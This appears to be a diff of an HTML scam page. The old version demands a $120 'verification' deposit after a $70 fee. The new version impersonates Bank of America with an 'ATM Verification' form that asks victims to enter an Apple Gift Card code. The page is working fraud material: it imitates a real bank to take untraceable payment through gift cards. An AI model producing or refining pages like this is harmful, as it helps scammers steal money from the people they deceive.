@@ -3,61 +3,23 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Withdrawal Verified</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f8f8f8;
-      color: #333;
-    }
-    .container {
-      max-width: 400px;
-      margin: 40px auto;
-      background: #fff;
-      padding: 30px 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .title {
-      color: #d72d2d;
-      font-size: 1.5em;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-    .message {
-      margin-top: 20px;
-      font-size: 1.1em;
-    }
-    .highlight {
-      color: #d72d2d;
-      font-weight: bold;
-    }
-    button {
-      margin-top: 30px;
-      padding: 14px;
-      width: 100%;
-      background: #d72d2d;
-      color: #fff;
-      border: none;
-      font-size: 1em;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #b52525;
-    }
-  </style>
+  <title>ATM Verification</title>
+  <link rel="stylesheet" href="style2.css">
 </head>
 <body>
+  <div style="background-color:#003366; color:white; padding:15px; text-align:center;">
+    <strong>Bank of America</strong>
+  </div>
+
   <div class="container">
-    <div class="title">✅ Withdrawal Verified</div>
-    <div class="message">
-      Your $70 fee has been received.<br/><br/>
-      To complete identity verification and enable full ATM access, please deposit a <span class="highlight">$120 verification amount</span>.
-    </div>
-    <button>Proceed to Verify & Unlock ATM Access</button>
+    <h2>ATM Verification Required</h2>
+    <p>Please enter the Apple Gift Card code below to verify your withdrawal request:</p>
+
+    <form action="receipt.html" method="GET">
+      <input type="text" name="giftcard" placeholder="Enter Apple Gift Card Code" required />
+      <br><br>
+      <button class="primary-button" type="submit">Verify & Continue</button>
+    </form>
   </div>
 </body>
 </html>
